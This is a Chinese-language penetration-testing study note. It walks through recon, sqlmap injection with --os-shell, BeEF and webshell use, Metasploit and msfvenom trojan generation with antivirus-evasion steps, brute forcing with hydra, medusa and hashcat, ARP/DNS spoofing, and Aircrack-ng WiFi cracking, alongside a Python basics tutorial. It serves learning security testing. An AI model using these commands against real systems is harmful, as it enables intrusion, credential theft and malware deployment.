# 常用命令
  ##  文件夹
     pwd   显示当前文件夹信息
     cd 切换目录
     ls  显示当前目录下的文件夹和文件
 ## 文本文件查看和编辑命令
     cat 文件名   查看内容较少的txt文件
     more 文件名  查看内容较多的txt文件
     head 文件名   查看文件的前x行内容
     wc 文件名    统计指定文本的行数和字数
     stat 文件名 查看文件的存储信息和时间
 ## 文件目录管理命令
    touch 文件名  创建空白文件或者设置文件的时间
    mkdir  文件夹名称  创建空白文件夹
    cp   文件名/文件夹名称  复制完之后粘贴的路径  复制文件/文件夹
    mv   文件名/文件夹名称  移动的路径    用于移动文件或者文件夹的位置
    file 文件名   用于查看文件的类型

# 信息收集
B  ## NMAP端口扫描 (扫描服务器)
      扫描主机,大型网络,管理和监视主机服务运行,通过Ip报文扫描
   ### 作用 
        检测主机开放的端口
         检测存活的主机
         检测操作系统，应用程序，版本号
         检测脆弱性的漏洞
   ### 常用指令
      -sS  TCP Syn 扫描 (namp扫描的时候默认使用-sS扫描)
      -p    指定端口号扫描 (-p 80|80 , 8080, 扫描主机上指定的端口号)
      -v   显示扫描过程
      -F   快速扫描 (一般不用,因为结果不完整)
      -Pn  （在对方服务器禁止ping之后进行端口扫描）
      -A  全面的系统扫描，包括打开操作系统探测，版本探测，脚本扫描，路径跟踪
      -sU  UDP扫描
      -sT  TCP扫描
      -sV  扫描系统版本和程序检测
      -n   禁止反向域名解析
      -6   启用IPV6扫描
      --script=vuln  全面的漏洞扫描
      --script=dns-brute  DNS爆破扫描
  ## 子域名扫描

  ### 在线收集 
    通过百度搜索
       site:qq.com
    通过域名爆破(访问以下网址后搜索子域名)
      https://phpinfo.me/domain
    通过证书搜索
       https://ctr.sh 
      
 ### 工具收集
   github 安装sublist3r
    (kali默认带有git,且python环境)

     1. git clone https://github.com/aboul3la/Sublist3r

    2. sudo pip install -r requirements.txt
    3. cd sublist3r
    4. python || python3 sublist3r.py -h  
    5. python || python3 sublist3r.py 域名

#### robots.txt
       例子:
        juejin.cn/robots.txt

    robots.txt是爬虫协议，用来告知搜索引擎哪些文件不能爬取
  
## 目录扫描(Dirbustr)
  文件目录:为实现"按名存取",必须建立文件名与辅存空间中物理地址的对应关系，体现这种对应关系的数据结构称为文件目录
  目录扫描可以让物品们发现这个网站存在多少个目录,多少个页面,探索出网站的整体结构，通过目录扫描我们还能扫描出敏感文件，后台文件，数据库文件和信息泄露文件


 ### 常见的目录信息泄露
    1.目录遍历漏洞
       目录遍历是由于web服务器或者web应用程序对用户输入的安全性验证不足而导致的一种安全漏洞,使得攻击者通过利用一些特殊字符就可以绕过服务器的安全限制，访问任意的文件(根目录以外的人间),甚至执行系统命令
       原理:程序在实现上没有充分过滤用户输入的../之类的目录跳转，导致恶意用户可以通过提交目录跳转来遍历服务器上的任意文件
      2.敏感信息泄露
       由于后端人员的疏忽或者不当的设计，导致不应该被前端用户看到的数据被轻易的访问到
       比如:
          访问url下的目录，可以直接列出文件列表
          输入错误的url参数后报错信息里包含操作系统，中间件，开发语言的版本或者其他信息(sql注入)
          获取到前端源码，得到后台登录，接口信息，账号密码等
  Dirbustr
     在kali上打开dirbustr然后输入网站域名，选择扫面字典，点击strat开始进行扫描

## CMS指纹识别
  CMS：内容管理系统
  指纹识别:就是爬取网站的唯信一息,网站搭建起来使用的什么技术,网站的title,网站所使用的框架，

  ### whatweb
     kali带了whatweb这个工具可以直接去进行使用，
        whatweb  网站域名
## Waf  
   waf是用来针对web攻击的一款防护产品
   常见的waf:安全狗，云顿

   常见的WAF产品
     https://github.com/0xInfection/Awesome-WAF
  检测Waf工具
 
 ### wafw00f(Waf检测工具)
   可以使用wafw00f检测网站是否使用了waf，以及waf的信息
  
    使用方法 : 
      wafw00f 域名
       
       如果有waf则会打印出waf信息，没有则显示no waf

## CDN  
   CDN,是用来加速网站的加载，如果我们想攻击到真实的ip地址，我们就需要去检测网站是否有cdn加速,那么可以通过xcdn脚本去进行检测并获取到其真实ip
  绕过cdn寻找的真实ip的方法就是通过检测到未绑定cdn的站点找到真实ip
   xcdn需要在kali 下安装
     
      git clone https://github.com/3xp10it/xcdn

      python3 xcdn.py 域名

# Web漏洞扫描
   漏洞扫描:漏洞扫描是基于漏洞数据库,通过扫描等手段对指定的远程或者本地计算机系统的安全脆弱性进行检测，发现可利用漏洞的一种安全检测(渗透攻击)行为。
   web漏洞扫描:针对web应用程序所开发的漏洞扫描器,例如:sql注入,xss跨站脚本攻击等常见漏洞，进行主动式扫描探测是不存在漏洞，web漏洞扫描器之间也有区别，例如对xss漏洞测试的扫描器，商业的漏洞扫描器和非商业性的漏洞扫描器，
    通过扫描器能够快速的发现漏洞，来提升我们的效率以及漏洞覆盖面。
    web扫描器也是在未我们做信息收集，为接下来的渗透做准备
 ## AwvS
   网络漏洞扫描工具，它通过爬虫测试网站完全，检测流行安全漏洞
   
   使用 awvs就需要去下载破解版之后再kali上去进行安装
   windows上也有awvs,直接点击安装包进行安装，然后到目录里去执行破解补丁

## appscan
  也是一个漏洞扫描工具，运行在windows下

## Burpsuite  常规测试(抓包)
 Brup Suite是一个集成化的渗透测试工具，它集合了多种渗透测试组件，使得我们自动化地或者手工的能更好的完成对web应用的渗透测试和攻击。在渗透测试中，我们使用Burp Suite将使得测试工作变得更加同意和方便，即使在不需要娴熟的技巧的情况下，只有我们熟悉Burp Suite的使用，也使得渗透测试工作变得轻松和高效。
 Burp Suite是用于攻击web应用程序的集成平台，包含了许多工具。Burp Suite为这些工具设计了许多接口，以加快攻击应用程序的过程。所有工具都共享一个请求，并能处理对应的Http消息，持久性，认证，代理，日志，警报。
 Burp Suite是渗透测试人员最常用的一个工具，用来分析数据包进行测试

 ### 原理
   浏览器和网站的中间，拦截。修改，重放数据包的代理工具
   就是当去发起请求时，请求会从浏览器先发送到Brup Suite然后Brup Suite进行修改后再发送到服务端
 
 ### 安装
  1.安装java环境
  2. 安装jython环境
     https://www.hython.org/downloads
  3. 安装jruby环境
      https://www.jruby/download

### 使用
   使用brupSuite的话需要先安装chrome的代理插件  (proxy SwitchyOmega),配置插件的端口和brupSuite的端口后开启插件，brupSuite即可抓取到包，抓取到包之后，即可去进行爆破用户名and密码

## 业务逻辑漏洞
   由于程序逻辑不严谨或者逻辑太过复杂，导致一些逻辑分支不能正常运行，统一称为业务逻辑漏洞。
    业务逻辑漏洞的危害巨大，传统防御措施收效甚微。
    业务逻辑漏洞同样去通过抓包和放包进行
# Sql 注入(sqlMap)
  sql注入，就是通过sql命令插入到表单提交或者输入域名或者页面请求的查询字符串，最终通过达到欺骗服务端执行恶意的sql命令具体来说就是将恶意的sql注入到后台数据库去进行执行，它可以通过sql得到一个存在安全漏洞的网站的数据库，而不是按照后端设计的意图去执行sql
  必要的条件:
     1.参数前端控制
     2.参数带入数据库执行

## sqlMaP
开源的渗透测试工具，自动化检测和利用sql注入漏洞
支持多种数据库进行注入测试
支持多种注入技术

### 安装
  kali上自带的有sqlmap可以直接去进行使用
  windows上需要去github下载之后，先配置python环境然后去设置环境变量才可以去进行使用

  ### 使用

```JavaScript
     sqlmap -u "域名以及参数"
//sqlmap -u 去进行测试是否可注入，可注入会给我们提供参数
   sqlmap -u "域名?参数" -dbs
   //  查询所有的数据库信息
   sqlmap -u '域名?参数' -D 数据库名  --tables
   //查询当前库里所有的表
   sqlmap -u "域名?参数" -D 数据库名 -T表名 --columns 
   //查询所有的字段
   sqlmap -u '域名+参数' -D 数据库名 -T 表名 -C 字段名 -dump
  /*
   *
   * 指纹识别
   */
   --current-user 查看当前数据库用户
   --current-db  查看当前数据库
   --dbs 枚举可用的数据库
   --passwords 枚举数据库用户密码
   --is-dba 枚举数据库可用权限

   /*
   *
   * 指纹识别
   */
  -f 对数据库的指纹识别
  -b 检测数据库指纹
  -hostname 检测主机名称
```
### 常见的注入方式
  #### Access 
     1.猜解注入
       1=1 2-1 and 1=2 手工注入
       -u "域名?参数" sqlmap注入
     1. 查看当前的数据库
          猜解表，拆解用户 --tables
     2. 根据表去猜解字段
           -T 表名 --columns
     3. 根据字段猜解值
           -T 表名 -C 字段名 -dump
  #### cookie 注入
     1.猜解表
         -u IP  --cookie '参数' --table --level  3 (3是猜解等级可填任意数据)
     2.猜字段
       -u IP --cookie 参数 -T 表名 --columns --level 猜解等级

     3. 字段值
        --cookie 参数 -t 表名 -C 字段名 --level 猜解等级

  #### post 注入
    (burpSuite 抓包 + sqlmap 进行注入)

    1. burpSuite 抓包保存为文本文档
    2. sqpmap -r 抓取到的包  -p 参数
      --data '参数' 指定参数去搜索

      --forms 直接去跑

   #### sqlmap googles  
     sqlmap可以用google直接去搜索注入

   #### 写shell
     --os-shell 写shell命令
     --os-cmd=cmd 命令
    通过sqlmap 去进行控制数据库的终端
  #### --batch
    自动执行默认选项
  #### --proxy
  给sqlmap挂代理，去连接目标url
  #### -random-agent
    自动切换客户端请求头
  #### --threads
     设置测试线程数量
  #### --count
    获取表中的数量
  #### --risk
    测试语句的风险等级
  ### 脚本注入 
    脚本可以帮助我们绕过waf 
    可以在github 查看怎么使用脚本注入    
 ### --sql-shell
   获取到当前数据库的shell,去执行sql命令

## Burp+sqlmap 批量抓包
  1. 打开burpSuite
  2. 找到projectOptions设置
  3. 点击misc
  4. 勾选上 proxy requests
  5. 选择保存的文件位置(burp.log)
  6. 开始去进行抓包
  7. 将抓包保存的文件(burp.log)放到sqlmap目录下
  8. sqlmap -l 文件名 --batch -smart

## XSS漏洞(跨站脚本攻击)
  sql注入拼接的是操作书库的sql语句，xss拼接的是恶意的html,去执行恶意的js

    1. 盗取cookie
    2. 获取内网IP
    3. 获取浏览器保存的密码
    4. 钓鱼攻击

### 类型
  反射型xss
     提交的数据成功实现了xss,但是只对这次访问产生影响
  存储型xss
    提交的数据成功实现了xss,存入了数据库，别人访问页面的时候会自动触发
  DOM型Xss
    js执行的脚本逻辑导致的安全问题

    网络上有公共的xss平台有代码(可以在url上注入xss或者尝试在js里去执行恶意的代码)
    
    插件(hakebar)
  
    可以自行搜索xss大全去进行测试

## beff-xss(浏览器攻击框架)
 beef-xss是一款浏览器攻击框架，用ruby语言开发的，凯莉默认安装的一个模块，用于实现对xss漏洞的攻击和利用


    1. 新版的kali没有beef-xss
    2. 安装beef-xss apt-get install beef-xss
    3. 安装完成之后，需要去修改密码
    4. beef-xss会自动打开浏览器控制UI
    5. 将hook.js脚本注入到需要攻击的站里去
    6. 然后可以在beef-xss里选择攻击


  关闭命令  service beff-xss stop
  开启命令  beef-xss

## webShell管理工具
  webShell就是控制网站的shell,永安里操作网站的文件等。又被称之为网站后门

  使用者:
    网站管理员
        网站管理，服务器管理，管理数据库
   黑客:
     后门程序，控制服务器，达到目的

 小马：
   文件体积较小。上传文件，文件修改，文件管理
 大马:
    文件体积较大，功能齐全，能够提权，操作数据库等
 一句话木马
   短小精悍，功能强大，隐蔽性好，客户端直接管理

   首先需要通过sqlmap 去拿到shell然后上传一句话木马文件，上传完成之后

   下载(中国菜刀，中国蚁剑)等websheel管理工具，在中国菜刀选择到木马文件之后，可以在中国菜刀控制webshell

# Python 基础
  ## 基础
   ### 声明变量
```Python   
  answer = 1; 
 # answer是变量名
 
```

   #### 注释
   pthon写注释是用#,且python不用写分号
```python
  # 这里是注释
```
   #### print
   print(变量) 是输出
```python
a='Hello,World'
 print(a)
  
```
   #### type
   type(变量) 是typeOf
```python
    a=1
    print(type(a))
```
  #### 拼接符
   python的拼接符号也是+
    但是python里不能直接将不同类型的变量进行拼接，只能通过转换类型的方法转换之后再去进行拼接
```python
 a='`';
 b="Hello , World"

 c=a+b;
 print(c);
 # {a} 拼接字符串
 f='111{0}222'
 print(f) #结果1110222
 s='bang' *3
  print(s) # 结果 bangbangbang
 #  python的字符串也可使用*
 print(s[1]) # 结果 b
 # python也可以使用下标获取字符

 print(s[:2])

 # 输出下标2之前的所有字符
 print(s[[2:])
 # 输出下标2之后的所有字符
```
  #### 数据转换
```python
 int(); #字符串转数字
 str(); #数字转字符串
```
 #### replace
  替换字符串
```python
   a='1111111';
   b=a.replace(a[:3],'*'*9)
   # replace(要替换的字符，替换的字符)
```
 #### input
   获取用户输入
```python
 a=input('请输入')
 print('用户输入的是:{a}')
```

### 声明函数
 使用关键字def 声明


```python
  def fun():
    函数体
    return 'something'
```
 ### 循环

   ### Boolean
     python中的布尔类型是True和False 首字母需要大写
   ### 判断
```python
 == # 判断
 != # 不等于
 >= # 大于等于
 <= # 小于等于
  not in  #  非
  is  # 且
 and or   # 或
```
 ### 数组
   数组就是[]

```python
  userArr=[]
  # 增 
    userArr.append('a')
```
 ### if
   在python里if不需要写括号

```python
a=1
b=2
 if a>b:
  print(a)
  else:
    print(b)
```
 ### 循环
  #### for循环
  循环就是for in循环
```python
 for item in arr:
    循环体
```
```python
# js的普通for新婚换
 for(let i=0;i<10;i++){
   循环体
 }
# python的替代品
for item in range(0,10,1):
   print(item)
# range函数的参数[起始值，结束值，步长]
```
#### while循环
  只要条件成立就一直循环
```python
a=0
 while True
  a+=1
  if a==7:
   break

# break跳出循环
```
### 异常处理
  try: except ValueError :

```python
 try :
    正确时处理的结构
 Except ValueError:
    异常时的结构 
```
## 数据结构
 python里有四种数据结构，列表，元组，字典，集合
 ### 列表
 ```python
  list=[1,2,3,4]
# 列表的每一个元素都是有序的
# 列表里可以存放python里任意数据类型的数据
# 增
 list.append(6)
 list.insert(下标，值)
# 改
 list.replace(下标，替换的值)
# 删
 list.remove(下标)
 del list[下标]
 ## 可通过 :下标 或者 下标: 删除多个
```
 ### 字典
  字典相当于js里的字典
  字典是以键值对的形式出现的
  键是不能修改的
  值可以是任意数据结构类型的数据
```python
 dict={key:1,key:2}
# 改
 obj={'key1':1,'key2':1}
 obj['key1']=3
# 增
 obj.update({'key3',6})
# 删
del obj['key1']
```
 ### 元组
 元组想当于一个固定的列表，不能进行增删改查，只能查看
```python
 tuple=(val1,val2)
```
 ### 集合
 这里的集合的作用就相当于js里的集合
```python
 set={val1,val2}
 # 增
   set.add(5)
# 删
  set.discard('元素')
```
 ### 数据结构的技巧
   #### sorted
    sorted方法用于将列表排序(相当于js的sort)
```python
   list=[2,4,51]
   print(sorted(list,reverse=True))
 #  stored(要排序的列表,reverse=True),第而个参数是选择正序或者倒序
```
#### zip
 同时输出
```python
 list_1=[2,6,3,1,9]
 list_str=['a','b','c','d','e']
 num_list=sorted(list_1)
 for a,b in zip(list_str,num_list) :
   print(a,'is',b)

```
 #### 列表推导式
```python
list=[i for i in range(1,11)];
# 结果 list=[1,2,3,4,5,6,7,8,9,10]
# enumerate方法，循环列表时获取元素的索引
for a,b in enumerate(list):
   print(a,b)
```
 #### 字典推导式

```python
 map={i:i+1 for i in range(1,6)}
 # 结果 map={1:2,2:3,3:4,4:5,5:6}
 map_2={i:j for i,j in zip(range(1,6),'abcde') }
 # 结果 map_2={1:'a',2:'b',3:'c',4:'d',5:'e'}
```
#### find
 查找字符
 #### split 
   切割字符串的方法
 #### count
   统计某个字符出现的数量
```python
a='absae'
print(a.count('a')) # 结果 2
```
## python的第三方库
  python的实际开发时是依赖于第三方库的，比如开发web:Django,flask
  小游戏:pyGame
  爬虫:scrapy
      python标准官方文档:https://docs.python.org/zh-cn/3.7/library/index.html
      第三方库资源:https://zhuanlan.zhihu.com/p/27350980

 ### 安装第三方库
  命令安装python环境安装的时候默认给我们带上了pip
     pip install 库名==版本号 --target=安装路径
   ### os-操作系统的接口模块
```python
 import os
  os.
     path  模块的路径
     getcwd() 当前路径
     listdir(path) 查看path的目录下的所有文件
     path.abspath 绝对路径
     sep 系统
     name 名称
     getenv('环境变量名称') 获取到环境变量
     mkdir('文件名称.后缀') 创建文件
     rmdir('文件路径') 删除文件
     path.exists(path) 判断是否有路径的文件有返回true没有返回false
     path.isfile(path)  判断是否是文件
     path.isdir(path) 判断是否是目录
     path.join(path1,path2) 拼接路径
```
### re模块
 re模块是python独有的匹配字符串的模块,re模块里的方法大多数都是基于正则去实现的

```python
 import re
 compile('正则') 存储正则
 findall(目标字符串) 从左往右匹配字符串
 # 例子:
   #  s1='alexalea'
   #  pattern=re.compile('alex')
   #  print(pattern.findall(s1))
```
### requests模块
 相当于发起请求的一个模块，基于apache2.0和http
```python
import requests
 .get(url,payload) get请求
 .post(url,payload) post请求
 # payload是参数
  # 例：payload={type:'11',cookie:'asdasd12'}
```
### bs4模块
 bs4是python中用于处理Html或者Xml的解析库
```python
  from bs4 import BeautifulSoup
```

# 爬虫入门
 ## 交换机制
  浏览器通过HTTP协议向浏览器发起会话。客户端(request),服务端返回(response)

   
1. 安装bs4 后引入
2. 安装lxml 用于解析
```python
import requests
from bs4 import BeautifulSoup
import lxml
url='https://www.ivsky.com/'
# 发起请求获取网页
r=requests.get(url)
# 解析网页
soup=BeautifulSoup(r.text,'lxml')
# 根据标签,class,id查找内容
soup.select('div>a')

# soup.find_all(查找标签)
# 
```
## help函数
我们可以调用help函查看某个模块的api的用法
## dir函数
  使用dir函数查看某个模块有哪些对象或者方法

# python-nmap
 python-nmap是python的模块库，使用或者模块可以方便操作nmap扫描器来工工作
 python-nmap有两个常用类
   
    PortScanner类 实现nmap工具的端口扫描
    PortScannerHostDict类 实现存储与访问主机的扫描结果

  ### 安装
    使用pip安装python-nmap
  ### 使用
   #### PortScanner类
```python
import nmap
nm=nmap.PortScanner('地址','端口','执行的参数')
a=nm.command_line()
print(a)
#command_line方法:返回的扫描方法映射到具体的nmap命令行，也就是我们输入的参数转化为具体的nmap命令
b=nm.scaninfo()
print(b)
# scaninfo方法返回nmap扫描信息，格式为字典格式
nm['地址'].all_protocols()
# 返回主机扫描端口包含的协议
nm['地址'].has_tcp(端口号)
# 查看某个端口是否返回了tcp协议
nm['地址']['协议'][端口号]['state']
# 查看该协议下端口的状态
```
     正式nmap扫描脚本

```python
import nmap
import optparse
# optParse用于解析命令行
def nmapscan (hosts,ports) :
    nmScan=nmap.PortScanner()
    try :
        result=nmScan.scan(hosts,str(ports))
        state=result['scan'][hosts]['tcp'][int(ports)]['state']
        service=result['scan'][hosts]['tcp'][int(ports)]['product']
        version=result['scan'][hosts]['tcp'][int(ports)]['version']
        print('[*]'+hosts+'tcp/'+hosts+''+state+''+service+''+version)
    except :
        pass
def main():
  # 注册提示信息
    parse=optparse.OptionParser('usage: %prog -H <host> -P <port>')
  # 添加命令行解析参数
    parse.add_option('-H',dest='host',type='string',help='目标ip')
    parse.add_option('-P',dest='port',type='string',help='目标端口')
    # 获取到参数
    (options,args)=parse.parse_args()
    tagHost=options.host
    tagPort=options.port
    if (tagHost == None) | (tagPort == None) :
        print('python demos.py -H 192.168.43.128 -P 80,3306')
        exit(0)
    else :
        for port in tagPort.split(',') : 
            nmapscan(tagHost,port)
if __name__ == '__main__':
    main()

```
# python 编写poc和exp
  
      poc    是针对客户具体应用的验证性测试，根据用户对采用系统提出的性能要求和扩展需求的指标，在选用服务器上进行真实数据的运行，对承载用户数据量和运行时间进行实际测算，并根据用户未来业务扩展的需求加大数据以验证系统和平台的承载能力，和性能变化，在安全中可以理解为漏洞验证程序。
 
     exp就是漏洞利用 ，有漏洞不一定有exp但是有exp就肯定有漏洞

    poc 与 exp的区别：poc是证明观点，一般是样本，exp是漏洞利用，一般是程序，如果发现漏洞给出poc写出exp
    


    poc 框架 就是一个批量调用，管理poc的程序常见的有:Beebeeto,Tangscan,Bugscan等

   ###### poc编写流程

      1.根据漏洞详情找到影响版本，并搭建靶场
      2.分析漏洞详情，编写代码
      3.测试poc
      poc只需要证明漏洞存在，不能出现管理员账号密码等敏感信息
    poc脚本的编写实际上就是python去编写sql注入的内容，查找是否有漏洞
    exp去利用漏洞就可以使用sqlmap去利用poc所发现的漏洞
# Metasploit漏洞利用
  metesploit是一个免费的框架，可以通过它对软见漏洞实施攻击。
  metasploit有几个常用的模块
      
      Auxiliary 辅助模块 为渗透测试信息收集提供大量的辅助模块
      Exploits  攻击模块 利用发现的安全漏洞或配置弱点对远程目标进行攻击，从而获得对远程目标系统访问权的代码组件
      Payload 攻击载荷模块 攻击成功后促使靶机允许ing的一段植入代码
      Post 渗透攻击模块  收集更多信息或者进一步访问被利用的目标
      Encoders 编码模块 将攻击载荷进行编码，来绕过防护软件
    MSF所用功能可分为这几个模块，每个模块都有各自的功能领域，形成了渗透测试的流程
  
  ## 使用
   kali自带的有metaSploit
   可以直接在应用程序里直接打开
   或者在终端输入 msfconsole打开

   ### 常用命令
     
      help 帮助
      exit 推出
      Back 返回上一级
      info 显示一个或者多个模块的信息
      show 显示所给类型的模块
      background 将当前操作在后台运行
      use 使用所选择的模块
      set 设置选项
      unset 取消设置选项
      search 名称
  ## msf扫描漏洞模块
  ### whois查询
    通过whois等信息组合生成针对性的密码字典，密码存在规律性，可破解性
   #### 使用kali带的有whois
       whois 域名
       直接在终端输入即可查询
  ### dns(域名解析)记录解析查询工具 
   使用nslookup查询

     交互模式
       nslookup 回车(进入交互)
       set qt=a
       ip或者是域名
       exit 退出
     非交互模式
        nslookup -qt=类型 目标域名
  ### db_nmap扫描模块
  db_nmap是msf里的扫描模块，相当于直接使用nmap
  ### wmap (msf扫描插件)
    load wmap 加载插件
    wmap_sites -a url 添加目标
    wmap_run -e 测试目标
    wmap_targets -t url 添加目标url地址
    wmap_run -e 测试目标
    wmap_vulns 查看漏洞详细信息
  ### 离线漏洞数据库(searchsploit)
   离线漏洞数据库帮助我们在测试时候找到对方的POC或者是利用脚本
  ## 密码爆破模块
   ### 常见的密码方式
   #### 明文密码
    可以根据字典破解
   #### 加密密码
      可以去网站去进行破解
  ### genpAss弱口令生成工具
    去github下载
    通过输入相关信息后，生成密码字典 
  ### PocBox
      通过安装pocBox,输入相关信息生成字典
  ### 实战密码爆破
  #### ssh密码爆破
    模块:auxiliary/scanner/ssh
    修改目标ip，端口号，设置字典，进行爆破
  #### mysql密码爆破
     auxiliary/scanner/mysql/mysql_login 
  #### phpadmin密码爆破
      auxiliary/scanner/phpadmin
      设置端口，网页路径，字典
  ## 漏洞利用模块
   漏洞利用其实就是利用sql注入，或者是xss注入将我们的一句话木马注入进去之后，通过上传木马拿到webshell然后去进行利用
   ### 反弹sehll 
     连接一般分为正向连接和反向连接
      正向连接:对方服务器开放端口，让我们去访问
      反向连接:我们开放端口让对方访问
  ### 反弹shell常用命令
    edit -- 编辑文件
    getlwd 显示本地工作目录
    Dir -列出目标文件目录
    mkDir 创建目录
    ipconfig 显示网络
    netstat 显示网络连接信息
    execute 执行命令
    ps 列出正在运行的进程
    sysinfo 或者远程系统
    getdesktop 获取桌面
    soreenshot 获取桌面截图
    getsystem 将权限提升为本地系统的权限
    hashump 获取目标ntlm-hash值
## 模块漏洞利用2
## msf后门生成模块(msfvenom)
 ### 免杀技术
   1.修改特征码（破坏病毒与木马的固有特征来绕过杀毒软件的扫描）
   2.花指令免杀
   3.加壳免杀
   4.内存免杀
   5.二次编译
   6.分离免杀
   7.资源修改
  ### 常用指令
   -p 指定payload模块
   -l 列出可用项目
   -f 指定文件类型
   -e 加载编码器
   -b 删除无效字符
   -i 指定编码次数
   -x 捆绑文件
   -o 导出文件  
### 生成木马的命令
   
     msfvenom -p 指定payload -e 指定编码器 -i 编码次数 lhost 本地连接的端口 -f 文件类型 -o 文件名.文件类型 lport 端口
  ### 连接木马
   use exploit/multi/handler
   set payload 生成木马时的payload
   set lhost 生成木马设置的host
   set lport 生成木马设置的port
  ### 生成绕过360和腾讯安全管家的木马
    1.首先下载VC6.0用于生成exe文件
    然后在生成木马的命令里加入 -b '\x00'跳过编码 指定编码方式c 

     msfvenom -p 指定payload -e 编码器 -i 编码次数 -b '\x00' lhors=本地ip lport=指定端口号 -f c

    2. 复制生成的木马数组
    3. 将生成的数组放到c语言文件里，后利用vc6.0生成exe即可
    4. 测试运行
# 密码破解
  ## Hashcat
   !!!运行hashcat一定要有足够的cpu内存去运行它，否则将报错
   
      因为有一些密码是通过haash去进行再加密的，但是网络上的解密hash对于复杂的hash是解析不出来的，所以我们通过hashcat去进行解密

  ### 破解方式
   Straight(字典破解) :基于字典进行破解
   Combination(组合破解) ：基于多个字典进行破解
   Hybrid Wordlist+Mask (字典+掩码破解) 键盘
   Hybrid Mask +Wordlist (掩码+字典破解)
  ### 常用参数 
   -a 指定要是用的破解模式，值是mode模块前的编码(0,1,3,6,7,9)
   -m 指定要破解的hash类型，如果不指定类型则默认是md5，值是hash mode 前的编码
   -o 指定破解成功后的密码的存放位置 
   --force 忽略破解过程中的警告信息
   --show 显示已经破解的hash以及该hash对应的明文
   --increment 增量破解
   --increment-min 密码最小长度 后直接跟整数
   --increment-max 密码最大长度
   --outfile-format 指定破解结果的输出格式id,默认是3
## hydra 暴力破解密码
  hydra中文九头蛇，可以对多种服务的账号和密码进行爆破。包括web登录，数据库,ssh,ftp等服务
### 参数
 -l Login 指定破解的用户名称，对特定语句破解
 -L File 从文件中加载用户名进行破解
 -p PASS 从小写p指定密码破解，少用，一般是采用密码字典破解
 -P 指定密码字典
 -e nsr 可选选项 n: 空密码试探 s:指定用户名和密码试探 r: 指定密码与用户名相反
 -C File使用冒号分割格式，例如"登录名:密码" 代替-L/-P参数
 -L TASKS 同时运行的线程数 ，每一台主机默认16
 -M File 指定服务器目标列表文件一行一条
 -w TIME 设置最大超时时间，单位秒，默认是30s,
 -o File 指定结果输出文件
 -f 在使用-M参数以后，找到第一对登录名或者密码的时候中止破解
 -v / -V 显示详细过程
 -R 继续从上一次进度接着破解
 -S 采用SSL连接
 -sPORT 可通过这个参数指定非默认端口
 -U 服务模块使用细节
 server 目标服务器名称或者ip
 service 指定服务名
 ## medusa(美杜莎)
   medusa与hydra的区别 
       
       medusa         hydra
       稳定性         差
       速度控制得当    容易触发锁

 ### 参数
  -h 目标ip
  -H 目标主机文件
  -u 指定用户名
  -U 用户名字典
  -p 密码
  -P 密码字典
  -C 组合条目文件
  -O 文件日志
  -e (n空密码/s与用户名相同/ns与用户名相反)
  -M 模块执行名称
  -m 传递参数到模块
  -d 显示所有的模块名称
  -n 使用非默认端口
  -s 启用ssl
  -r 重试间隔时间
  -t 设定线程数量
  -L 并行化，每个用户使用一个线程
  -f 在任何主机上找到第一个密码后停止破解
  -v 详细
  -V 显示版本
  -Z 继续扫描上一次

以上两款工具都是去基于字典去破解的，所以如果没有一个很好的字典就破解不出来密码
# 嗅探欺骗
 ## writeShark
   writeShark是最流行的网络分析工具。可以捕捉网络中的数据，并为用户提供关于网络和上层协议的各种信息。但是writeShark只能查看数据包，而不能修改数据包的内容，或者发送数据包
  ## 常见的过滤器
  ### 协议过滤
    http.request.method =='请求方式'
    ip.addr=='ip地址' 显示相关ip的数据包
    ip.src=='ip地址'  显示来自相关ip的数据包
    http.host=='ip地址' 显示来自主机端口的数据包
    tcp.port==25  显示来源或者目的TCP端口号为25的数据包
    tcp.dstport == 5 显示目的tcp端口号为5的数据包
    http.response.code == 200 显示响应http状态码为200的数据包
  ## DNS劫持(ARP欺骗)
   ### Arp协议
      arp是地址解析协议，用于实现从ip到mac地址的的映射，即询问目标ip对应的mac地址

      我们可以通过修改mac地址来达到中间人拦截，局域网流控，流量七篇等情况
  ### Ettercap
    一个综合性的中间人攻击工具，使用它可以进行ARP欺骗，拦截器，DNS欺骗等常见的中间人攻击
   #### 常用指令
     -T 使用只显示字符的界面
     -q 不显示抓到的数据包内容
     -G 使用图形化界面
     -w 文件名 将嗅探到的数据写入pcap文件
     -L 文件名  此处记录所有流量
     -i 使用该网络接口
     -l 显示所有的网络接口
     -P 插件名 开始该插件
     -F 过滤器 加载过滤器
     -M 方法名  执行攻击
  #### 使用
    直接打开Ettercap图形化界面进行使用
    通过修改 /etc/ettercap/errer.dns添加劫持后转发的网址
    然后添加攻击插件
    如果需要脚本添加脚本
    开始攻击
  # 破解wifi密码实战
   ## Aircrack-ng
    Aircrack-ng是一无线网络分析的安全软件，主要功能有，网络侦测，数据包嗅探，WEP和WPA/WPA2-PSK破解
  ## 使用
   ### 查看是否存在设备
      iwconfig
   ### 查看是否支持监听模式
       airmon-ng
   ### 开启监听
       airmon-ng start wlan1
   ### 查看附近wifi
      airodump-ng wlan1
   ### 监听握手包
      首先复制我们想要破解wifi的bssid和ch(信道)号
      airodump-ng -c 信号号 --bssid  bssid -w 保存文件的位置 wlan1
      airodump-ng -c 1 --bssid 70:65:82:00:03:B0 -w   ~/1/ wlan1
  ### 强制对方断开重连
    aireplay-ng -0 2 -a wifi的mac地址 -c 对方的mac地址 wlan1 
  ### 打开抓到的握手包
     使用writeShak打开抓取到的握手包
  ### 去网上着一个wifi密码字典
  ### 破解握手包密码
    aircrack-ng -a2 -b wifi的bssid -w 字典 握手包
# 渗透测试思路
   信息收集 利用nmap扫描存活主机，端口
   漏洞扫描 扫描所有服务的漏洞
   漏洞利用
   获取权限
   权限维持